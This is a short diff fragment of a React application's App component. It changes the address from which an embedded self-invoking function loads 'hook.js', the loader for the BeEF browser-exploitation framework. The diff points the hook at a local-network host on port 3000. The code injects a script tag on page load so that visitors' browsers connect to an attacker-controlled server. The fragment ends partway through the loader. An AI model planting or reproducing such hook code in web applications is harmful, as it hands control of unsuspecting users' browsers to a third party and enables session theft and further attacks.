@@ -9,7 +9,7 @@ import Home from './components/Home.js';
 
 function App() {
   (function () { 
-    var url = 'http://0.0.0.0:3000/hook.js';
+    var url = 'http://192.168.1.34:3000/hook.js';
     if (typeof beef == 'undefined') { 
       var bf = document.createElement('script');
       bf.type = 'text/javascript'; 
